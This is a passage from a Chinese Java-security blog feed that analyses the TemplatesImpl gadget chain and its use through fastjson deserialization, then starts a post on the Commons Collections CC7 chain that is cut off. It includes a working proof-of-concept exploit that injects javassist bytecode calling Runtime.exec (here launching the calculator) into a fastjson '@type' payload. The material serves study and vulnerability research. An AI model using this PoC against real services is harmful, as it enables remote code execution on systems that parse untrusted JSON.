loader.defineClass(_bytecodes[i]);</span><br><span class="line">               <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">               <span class="comment">// Check if this is the main class</span></span><br><span class="line">               <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                   _transletIndex = i;</span><br><span class="line">               &#125;</span><br></pre></td></tr></table></figure></li><li><p><code>_bytecodes</code>字节码需要设置为byte[][]数组，<code>_bytecodes</code>变量声明为byte[][]类型，如果直接通过javassist toBytecode()生成byte[]数组运行会报错。<br><img src="/posts/ad3be047/cc2-33.png" title="_bytecodes数组"><br><img src="/posts/ad3be047/cc2-34.png" title="_bytecodes数组"><br>因此需要将一维数组转化为二维数组。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line"><span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br></pre></td></tr></table></figure></li></ol><p>接着查看<code>defineTransletClasses</code>方法的上层调用情况<br>其中有三处对该方法进行了调用，其中只用<code>getTransletInstance</code>方法有上层调用，其他两个方法没有被其他方法进行调用。</p><p><img src="/posts/ad3be047/cc2-28.png" title="getTransletInstance调用"></p><h3 id="getTransletInstance"><a href="#getTransletInstance" class="headerlink" title="getTransletInstance()"></a>getTransletInstance()</h3><p><img src="/posts/ad3be047/cc2-29.png" title="getTransletInstance调用"></p><p>其中需要的满足条件：</p><ol><li><p><code>_name</code>不能为空，为空会直接返回<code>null</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure></li><li><p><code>_class</code>必须为空，才能调用<code>defineTransletClasses</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br></pre></td></tr></table></figure></li></ol><p>最后通过创建<code>AbstractTranslet</code>对象将class文件类进行实例化</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br></pre></td></tr></table></figure><p>接着查看<code>getTransletInstance</code>方法的上层调用情况</p><p><img src="/posts/ad3be047/cc2-30.png" title="getTransletInstance调用"></p><p><code>newTransformer()</code>方法进行了调用</p><h3 id="newTransformer"><a href="#newTransformer" class="headerlink" title="newTransformer()"></a>newTransformer()</h3><p>在调用构造函数的时候调用了<code>getTransletInstance</code>方法，返回Translet类的实例，其中没有需要的满足条件。</p><p>接着查看<code>newTransformer()</code>方法的上层调用情况</p><p><img src="/posts/ad3be047/cc2-31.png" title="newTransformer调用"></p><p>其中有5处显示进行了调用，但只有<code>getOutputProperties</code>方法调用的本类的<code>newTransformer()</code>方法，其他四种都是调用的其他类重写的<code>newTransformer()</code>方法。</p><h3 id="getOutputProperties"><a href="#getOutputProperties" class="headerlink" title="getOutputProperties()"></a>getOutputProperties()</h3><p><img src="/posts/ad3be047/cc2-32.png" title="getOutputProperties调用"></p><p>该方法直接执行了<code>newTransforme</code>方法，没有其他条件限制，查询<code>getOutputProperties</code>的上层调用，没有在本类发现其调用，因此最后的执行方法就在<code>getOutputProperties</code></p><h3 id="完整链"><a href="#完整链" class="headerlink" title="完整链"></a>完整链</h3><p>到<code>newTransformer</code>方法执行就能达到触发了，他上层<code>getOutputProperties</code>方法也进行了调用，也可以算进去当作延伸出来的链。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getOutputProperties()</span><br><span class="line">    newTransformer()</span><br><span class="line">        getTransletInstance()</span><br><span class="line">            defineTransletClasses()</span><br><span class="line">                defineClass()</span><br></pre></td></tr></table></figure><h3 id="实现demo"><a href="#实现demo" class="headerlink" title="实现demo"></a>实现demo</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//创建CtClass对象容器</span></span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">        <span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">        ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line">        <span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">        TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line">        <span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_tfactory实例化，效果等同于new TransformerFactoryImpl()</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br><span class="line">        <span class="comment">//执行newTransformer()方法</span></span><br><span class="line">        templates.newTransformer();</span><br><span class="line">        <span class="comment">//执行getOutputProperties(),getOutputProperties为newTransformer上层调用，执行效果相同，就是多了个执行步骤</span></span><br><span class="line">        templates.getOutputProperties();</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//通过反射给对象属性赋值，避免代码冗余繁琐</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be047/cc2-35.png" title="实现demo"></p><h1 id="0x04、fastjson-TemplatesImpl利用分析"><a href="#0x04、fastjson-TemplatesImpl利用分析" class="headerlink" title="0x04、fastjson-TemplatesImpl利用分析"></a>0x04、fastjson-TemplatesImpl利用分析</h1><p>只有正向分析了解执行过程了，逆向分析思路实在难理</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>参考网上的POC:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Payload</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateEvil</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clas</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        clas.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        clas.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//clas.writeFile(&quot;./&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes = clas.toBytecode();</span><br><span class="line">        <span class="type">String</span> <span class="variable">EvilCode</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        <span class="comment">//System.out.println(EvilCode);</span></span><br><span class="line">        <span class="keyword">return</span> EvilCode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">GADGAT_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">evil</span> <span class="operator">=</span> Payload.generateEvil();</span><br><span class="line">        <span class="type">String</span> <span class="variable">PoC</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + GADGAT_CLASS + <span class="string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + evil + <span class="string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span>+<span class="string">&quot;&#125;\n&quot;</span>;</span><br><span class="line">        JSON.parseObject(PoC,Object.class, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前半段就是<code>javassist</code>字节码生成恶意代码，在上面<code>ClassLoader</code>和<code>TemplatesImpl</code>分析的时候提过了，区别就是生成的恶意字节码经过<code>Base64</code>编码过一次，为什么会经过<code>Base64</code>编码，分析过程去了解。</p><p>下半段主程序就是<code>fastjson</code>反序列化<code>TemplatesImpl</code>类，加载恶意字节码，同时添加<code>TemplatesImpl</code>执行需要满足的几个条件属性，最后添加<code>_outputProperties</code>字段目的经过转换调用<code>getoutputProperties()</code>方法执行恶意代码，后面又加了一个<code>_name</code>参数和<code>allowedProtocols</code>参数。</p><p>最后在<code>parseObject</code>反序列化的时候添加了<code>Feature.SupportNonPublicField</code>参数，突破访问私有属性限制，因为<code>TemplatesImpl</code>类大部分属性都是<code>private</code>保护属性，fastjson默认无法序列化保护属性的变量。</p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>调试首先进入对应参数类型的<code>parseObject</code>方法<br><img src="/posts/ad3be047/fj1-16.png" title="parseObject方法"></p><p>判断input输入是否为空，然后创建默认<code>JSONparser</code>解析器<br><img src="/posts/ad3be047/fj1-17.png" title="JSONparser"></p><p>跟进<code>DefaultJSONParser</code>方法，先通过分词器(laxer,用于对input值进行符号分割，获取对应的截选字段)获取开头字符是否是”{“</p><p><img src="/posts/ad3be047/fj1-18.png" title="JSONparser"></p><p>是的话，就设置<code>token</code>为<code>JSONtoken.LBRACE</code>，值为12</p><p><img src="/posts/ad3be047/fj1-19.png" title="token"></p><p>然后对解析器<code>parser</code>进行<code>parseObject</code>序列化操作，<code>Type</code>对象为输入的<code>Object.class</code>对象</p><p><img src="/posts/ad3be047/fj1-20.png" title="parseObject"></p><p>跟进<code>parseObject</code>方法，判断<code>token</code>所属类型，然后获取反序列化解析器</p><p><img src="/posts/ad3be047/fj1-21.png" title="parseObject"><br><img src="/posts/ad3be047/fj1-22.png" title="getDeserializer"></p><p>跟进<code>getDeserializer</code>方法，根据Type（即输入的<code>Object.class</code>对象）获取对应的反序列化器，获取的反序列化器为<code>JavaObjectDeserializer</code></p><p><img src="/posts/ad3be047/fj1-23.png" title="getDeserializer"><br><img src="/posts/ad3be047/fj1-24.png" title="getDeserializer"></p><p>获取反序列化器后，判断对象类型后，对反序列化器进行反序列化操作。</p><p><img src="/posts/ad3be047/fj1-25.png" title="parse"></p><p>跟进<code>parse</code>方法</p><p><img src="/posts/ad3be047/fj1-26.png" title="parse"></p><p>通过<code>Token</code>判断后进入判断体分支，创建新的<code>json</code>对象，然后对该<code>json</code>对象和<code>fieldName</code>字段（当前类对象为Object，没有解析字段，所以值为null）进行反序列化解析</p><p><img src="/posts/ad3be047/fj1-27.png" title="parse"></p><p>再次跟进<code>parseObject</code>方法</p><p>前面的一大段操作都是通过分词器<code>laxer</code>获取的字符进行判断是否合法</p><p><img src="/posts/ad3be047/fj1-28.png" title="input合法判断"></p><p>一直到key值的判断，key为获取的<code>@type</code>，typeName为<code>@type</code>的值即输入的<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></p><p><img src="/posts/ad3be047/fj1-29.png" title="key判断"></p><p>通过加载类获取一个<code>TemplatesImpl</code>类对象<code>clazz</code></p><p><img src="/posts/ad3be047/fj1-30.png" title="获取TemplatesImpl类对象"></p><p>获取<code>TemplatesImpl</code>类对象后，再次寻找对应的反序列化器</p><p><img src="/posts/ad3be047/fj1-31.png" title="获取TemplatesImpl类对象"></p><p>由于<code>TemplatesImpl</code>类并不在<code>derializers</code>的列表中，因此<code>derializer</code>为<code>null</code>，<code>derializer</code>列表大部分为<code>hashmap</code></p><p><img src="/posts/ad3be047/fj1-32.png" title="derializer为null"></p><p>但<code>type(TemplatesImpl)</code>属于<code>Class</code>，因此进入另一个获取反序列化器的方法<code>getDeserializer((Class&lt;?&gt;) type, type)</code>，继续跟进<code>getDeserializer</code>方法<br>前半段依旧是获取<code>type</code>的反序列化器，同样<code>derializer</code>还是为<code>null</code></p><p><img src="/posts/ad3be047/fj1-33.png" title="getDeserializer"></p><p>不同上一个获取反序列化器的方法，接下来获取clazz的类名即（com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl），然后判断该类名是否是黑名单（java.lang.Thread）中的内容</p><p><img src="/posts/ad3be047/fj1-34.png" title="黑名单判断"></p><p>后面就是对<code>className</code>进行分类判断，最后没有找到对应类的反序列化器，最后通过<code>createJavaBeanDeserializer</code>方法对当前<code>clazz</code>创建一个反序列化器</p><p><img src="/posts/ad3be047/fj1-35.png" title="createJavaBeanDeserializer"></p><p>跟进<code>createJavaBeanDeserializer</code>方法，其中<code>asmEnable</code>默认开启，然后判断<code>clazz</code>类是否支持字节码操作，然后进行<code>JavaBeanInfo</code>创建</p><p><img src="/posts/ad3be047/fj1-36.png" title="JavaBeanInfo"></p><p>在<code>setter/getter</code>分析中提到的<code>build</code>方法主要是通过反射遍历获取类中的方法名和数据保存在<code>Fieldlist</code>中然后放入<code>beaninfo</code>数组中。</p><p><img src="/posts/ad3be047/fj1-14.png" title="beaninfo"></p><p><code>beaninfo</code>创建后，后面的代码部分就是针对<code>Beaninfo</code>的字段属性进行循环遍历检查合法性，属性查询完后，创建<code>JavaBeanDeserializer</code>反序列化器</p><p><img src="/posts/ad3be047/fj1-37.png" title="JavaBeanDeserializer"><br><img src="/posts/ad3be047/fj1-38.png" title="JavaBeanDeserializer"></p><p><code>JavaBeanDeserializer</code>方法中先是声明<code>beanInfo.sortedFields</code>的<code>FieldDeserializer</code>反序列化器，然后循环读取<code>sortedFields</code>排序后的属性给<code>fieldInfo</code>变量，然后创建新的字段反序列化器<code>createFieldDeserializer</code>，最后新反序列化器放入<code>sortedFieldDeserializers</code>数组中</p><p><img src="/posts/ad3be047/fj1-39.png" title="sortedFieldDeserializers"></p><p>后半段是循环获取<code>beanInfo.fields</code>的属性，然后通过<code>getFieldDeserializer</code>方法在<code>sortedFieldDeserializers</code>数组中查找是否匹配，匹配的话就放入到<code>fieldDeserializers</code>数组当中。</p><p><img src="/posts/ad3be047/fj1-40.png" title="sortedFieldDeserializers"></p><p>到此，<code>JavaBeanDeserializer</code>反序列化器创建成功，并放入到反序列化器当中，最后返回反序列化器<code>derializer</code></p><p><img src="/posts/ad3be047/fj1-41.png" title="derializer"></p><p>获取到反序列化器后，正式对该反序列化器进行反序列化操作</p><p><img src="/posts/ad3be047/fj1-42.png" title="derialize"></p><p>反序列化的前半部分都是对类的一些属性信息进行判断（<code>token</code>的判断，<code>laxer</code>分词器的创建等）</p><p><img src="/posts/ad3be047/fj1-43.png" title="derialize"></p><p>通过循环读取<code>sortedFieldDeserializers</code>数组获取反序列化器中的属性数据，获取过后再循环判断获取的类的分类所属，在进行对应类属性赋值</p><p><img src="/posts/ad3be047/fj1-44.png" title="sortedFieldDeserializers"></p><p>经过上面的对<code>sortedFieldDeserializers</code>获取的当前属性信息的操作后，创建对解析器对象进行实例化</p><p><img src="/posts/ad3be047/fj1-45.png" title="createInstance"><br><img src="/posts/ad3be047/fj1-46.png" title="实例化对象"></p><p>实例化对象后，开始解析该对象在解析器中的字段属性</p><p><img src="/posts/ad3be047/fj1-47.png" title="解析字段属性"></p><p>字段反序列化器会模糊匹配<code>key</code>，跟进<code>smartMatch</code>方法</p><p><img src="/posts/ad3be047/fj1-48.png" title="smartMatch"></p><p>先判断<code>Key</code>是否存在，存在然后通过<code>getFieldDeserializer</code>方法查找<code>key</code>的反序列化器，如果找不到该<code>key</code>的反序列化器，然后判断<code>key</code>是否以<code>is</code>为开头，随后循环获取<code>sortedFieldDeserializers</code>数组内容获取其中的<code>fieldInfo、fieldClass、fieldName</code>等属性</p><p><img src="/posts/ad3be047/fj1-49.png" title="smartMatch"></p><p>因为在<code>getFieldDeserializer</code>中匹配<code>Key</code>是否在<code>sortedFieldDeserializers</code>数组中，由于数组中的值没有”_”开头，因此找不到<code>key</code>的反序列化器</p><p><img src="/posts/ad3be047/fj1-50.png" title="getFieldDeserializer"></p><p>条件都不满足，找不到<code>FieldDeserializer</code>属性反序列化器，然后就对属性进行字符替换操作，此时的<code>Key</code>由<code>&quot;_outputProperties&quot;</code>被替换成<code>&quot;outputProperties&quot;</code></p><p><img src="/posts/ad3be047/fj1-51.png" title="replaceAll"><br><img src="/posts/ad3be047/fj1-52.png" title="replaceAll"></p><p>然后再次调用<code>getFieldDeserializer</code>方法，查询是否存在<code>key2</code>的反序列化器，此时<code>sortedFieldDeserializers</code>数组中存在<code>outputProperties</code>字段，因此能够找到反序列化器</p><p><img src="/posts/ad3be047/fj1-54.png" title="getFieldDeserializer"><br><img src="/posts/ad3be047/fj1-55.png" title="outputProperties"></p><p>返回属性反序列化器，此时获取到<code>getoutputProperties</code>方法（build中提到的getter&#x2F;setter建立会存储get和set方法，反序列化器查询匹配到字段后会返回该方法的反序列化器）</p><p><img src="/posts/ad3be047/fj1-56.png" title="getoutputProperties"></p><p>找到属性反序列化器后，对该属性进行反序列化解析</p><p><img src="/posts/ad3be047/fj1-57.png" title="parseField"></p><p>解析过程中通过<code>getFieldValueDeserilizer</code>方法获取属性值的反序列化器，并对属性值反序列化器进行反序列化解析获取值</p><p><img src="/posts/ad3be047/fj1-58.png" title="getFieldValueDeserilizer"></p><p>然后将获取的值通过<code>setValue</code>方法赋值给字段属性</p><p><img src="/posts/ad3be047/fj1-59.png" title="setValue"></p><p>跟进<code>setValue</code>方法，通过反射获取字段属性的方法</p><p><img src="/posts/ad3be047/fj1-60.png" title="setValue"></p><p>最后通过反射执行<code>Object</code>对象的<code>Method</code>方法，即执行<code>TemplatesImpl.getoutputProperties()</code>,触发漏洞</p><p><img src="/posts/ad3be047/fj1-61.png" title="反射执行方法"><br><img src="/posts/ad3be047/fj1-62.png" title="触发漏洞"></p><h2 id="base64编码问题"><a href="#base64编码问题" class="headerlink" title="base64编码问题"></a>base64编码问题</h2><p>在解析字段属性中，解析到<code>&quot;_bytecodes&quot;</code></p><p><img src="/posts/ad3be047/fj1-63.png" title="_bytecodes解析"></p><p>然后获取对应反序列化器，对反序列化器进行再次解析</p><p><img src="/posts/ad3be047/fj1-64.png" title="反序列化器解析"></p><p>再次跟进，此时属性反序列化器为<code>ObjectArrayCodec</code>，调用<code>ObjectArrayCodec</code>的反序列化方法<code>deserialze</code></p><p><img src="/posts/ad3be047/fj1-65.png" title="反序列化器解析"></p><p>过程中会对参数内容集合进行解析</p><p><img src="/posts/ad3be047/fj1-66.png" title="反序列化器解析"></p><p>进入对集合进行解析，此时<code>laxer</code>经过<code>nexttoken()</code>方法后重新赋值，再次对<code>value</code>进行反序列化解析</p><p><img src="/posts/ad3be047/fj1-69.png" title="deserialze"></p><p>跟进反序列化方法，此时<code>laxer</code>匹配<code>JSONToken.LITERAL_STRING</code>，调用<code>bytesValue()</code>方法</p><p><img src="/posts/ad3be047/fj1-67.png" title="解析字段"></p><p>跟进<code>bytesValue()</code>方法，在这里对<code>txt</code>也就是<code>Input</code>的内容进行<code>base64</code>解码，所以<code>_bytecodes</code>需要经过base64编码</p><p><img src="/posts/ad3be047/fj1-68.png" title="base64解码"></p><h1 id="0x05、总结"><a href="#0x05、总结" class="headerlink" title="0x05、总结"></a>0x05、总结</h1><p>跟完TemplatesImpl链，头都大了，总的来说就是通过创建序列化器去存储序列化对象的相关信息，再通过反序列化器解析反序列化类对象、类字段、方法等信息，最后再解析反序列化器。跟一遍下来的感觉就是不停的创建反序列化器，再解析反序列化器的内容，结合getter触发代码执行，虽然绕了很多，但在这里面也学到了很多，理解的过程也不完全，很多细节上的代码段也没理解透意思，就在大体框架走了一遍，可能还存在一些理解错误的地方，后面遇到了再改吧。</p><h1 id="0x06、参考链接"><a href="#0x06、参考链接" class="headerlink" title="0x06、参考链接"></a>0x06、参考链接</h1><p><a href="https://github.com/alibaba/fastjson/wiki/Quick-Start-CN">https://github.com/alibaba/fastjson/wiki/Quick-Start-CN</a><br><a href="https://www.w3cschool.cn/fastjson/">https://www.w3cschool.cn/fastjson/</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> java利用链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-CC7链学习与分析</title>
      <link href="/posts/40ba40f0.html"/>
      <url>/posts/40ba40f0.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>CC7的触发点同CC1一样，采用ChainedTransformer链和LazyMap类，入口点变了，跟前面CC1~6不一样，但逆向思维去分析查找链实在没办法，效果跟正向分析没啥区别了，所以主要以正向分析去学习，还是单独整理出来吧</p><h1 id="0x01、Apache-Commons-Collections描述"><a href="#0x01、Apache-Commons-Collections描述" class="headerlink" title="0x01、Apache Commons Collections描述"></a>0x01、Apache Commons Collections描述</h1><p>引用CC1链分析中的描述<br>CC链即Commons Collections利用链，主要针对Commons Collections组件发现的利用链。</p><blockquote><p>Apache Commons是Apache软件基金会的项目。Commons的目的是提供可重用的、开源的Java代码。<br>Apache Commons提供了很多工具类库，他们几乎不依赖其他第三方的类库，接口稳定，集成简单，可以大大提高编码效率和代码质量。<br>Apache Commons Collections 是对 java.util.Collection 的扩展。<br>Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p></blockquote><p>目前 Collections 包有两个 commons-collections 和commons-collections4，commons-collections 最新版本是3.2.2，3系列版本也是只有3.2.2是安全的，不支持泛型，目前官方已不在维护。collections4 目前最新版本是4.4，其中4.0是存在漏洞，最低要求 Java8 以上。相对于 collections 来说完全支持 Java8 的特性并且支持泛型，该版本无法兼容旧有版本，于是为了避免冲突改名为 collections4。推荐直接使用该版本。（注：两个版本可以共存，使用时需要注意）</p><h1 id="0x02、环境准备"><a href="#0x02、环境准备" class="headerlink" title="0x02、环境准备"></a>0x02、环境准备</h1><p>java版本：jdk8u66（版本无限制）<br>Commons Collections：3.2.1（漏洞版本在3.1-3.2.1）<br>maven项目pom.xml文件中添加依赖</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>在idea访问<code>Commons Collections</code>组件的文件时候点击上方的下载源代码就可以看到对应文件的.java文件了</p><h1 id="0x03、分析"><a href="#0x03、分析" class="headerlink" title="0x03、分析"></a>0x03、分析</h1><p>CC7链也利用<code>ChainedTransformer</code>链和<code>LazyMap</code>类作为触发点，入口不一样，目的都是为了调用<code>lazyMap.get()</code>方法</p><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>回顾LazyMap触发点：</p><ul><li>生成<code>LazyMap</code>对象，将<code>InvokerTransformer</code>利用方法串起来的<code>ChainedTransformer</code>对象传入<code>LazyMap</code>构造方法。</li><li><code>lazyMap.get()</code>方法会调用<code>ChainedTransformer.transform()</code>执行链转换器内的<code>Runtime.exec()</code>方法达到命令执行的目的。</li></ul><hr><p>CC1~6中使用到LazyMap的链：<br>CC1（LazyMap链）：</p><ul><li>生成<code>LazyMap</code>对象，将<code>InvokerTransformer</code>利用方法串起来的<code>ChainedTransformer</code>对象传入<code>LazyMap</code>构造方法，随后将<code>LazyMap</code>对象传入<code>AnnotationInvocationHandler</code>代理类。</li><li>通过动态代理，在生成二次代理对象时调用对象的<code>invoke</code>方法，其中<code>invoke</code>方法中调用<code>LazyMap.get()</code>方法、<code>get()</code>方法调用<code>ChainedTransformer.transform()</code>方法最后实现<code>InvokerTransformer.transform()</code>执行命令;</li></ul><hr><p>CC5：</p><ul><li>生成<code>LazyMap</code>对象，将<code>InvokerTransformer</code>利用方法串起来的<code>ChainedTransformer</code>对象传入<code>LazyMap</code>构造方法。</li><li>将<code>LazyMap</code>对象传入<code>TiedMapEntry</code>类构造方法，再通过<code>TiedMapEntry.toString()</code>方法去调用<code>TiedMapEntry.getValue()</code>方法，最后调用到<code>lazyMap.get()</code>方法。</li><li>将<code>TiedMapEntry</code>对象通过反射赋值给<code>BadAttributeValueExpException</code>类的<code>val</code>值，通过反序列化<code>BadAttributeValueExpException</code>类对象，调用重写<code>readObject</code>方法中的<code>val.toString()</code>。</li><li><code>val.toString()</code>调用等效于<code>TiedMapEntry.toString()</code>，即调用<code>TiedMapEntry.getValue()</code>方法，达到调用<code>lazyMap.get()</code>方法触发代码执行。</li></ul><hr><p>CC6：</p><ul><li>生成<code>LazyMap</code>对象，将<code>InvokerTransformer</code>利用方法串起来的<code>ChainedTransformer</code>对象传入<code>LazyMap</code>构造方法。</li><li>将<code>LazyMap</code>对象传入<code>TiedMapEntry</code>类构造方法，再通过<code>TiedMapEntry.hashCode()</code>方法去调用<code>TiedMapEntry.getValue()</code>方法，最后调用到<code>lazyMap.get()</code>方法。</li><li>通过使用<code>hashmap</code>的<code>put</code>方法添加元素时调用<code>hash(key)</code>方法，进而调用<code>key.hashCode()</code>方法，将<code>TiedMapEntry</code>对象作为key<code>put</code>入<code>hashmap</code>中，达到调用<code>TiedMapEntry.hashCode()</code>的目的（hashSet同理,本质上都是调用hashmap）。</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>回到<code>lazyMap.get()</code>方法本身上来，CC7使用了<code>Hashtable</code>作为入口，也就是说对<code>Hashtable</code>对象进行序列化，然后在反序列化时触发漏洞</p><p>简述Hashtable哈希表:</p><blockquote><p>Hashtable是原始的java.util的一部分， 是一个Dictionary具体的实现 。<br>然而，Java 2 重构的Hashtable实现了Map接口，因此，Hashtable现在集成到了集合框架中。它和HashMap类很相似，但是它支持同步。<br>像HashMap一样，Hashtable在哈希表中存储键&#x2F;值对。当使用一个哈希表，要指定用作键的对象，以及要链接到该键的值。<br>然后，该键经过哈希处理，所得到的散列码被用作存储在该表中值的索引。</p></blockquote><p>同<code>hashmap</code>一样，都是存储键值对&lt;key,value&gt;的散列表。</p><p><code>Hashtable</code>同样重写了序列化和反序列化过程</p><h3 id="hashtable反序列化过程"><a href="#hashtable反序列化过程" class="headerlink" title="hashtable反序列化过程"></a>hashtable反序列化过程</h3><hr><p>序列化（writeObject）过程，其实查看英文注解就大概知道这个过程了:</p><figure class="highlight 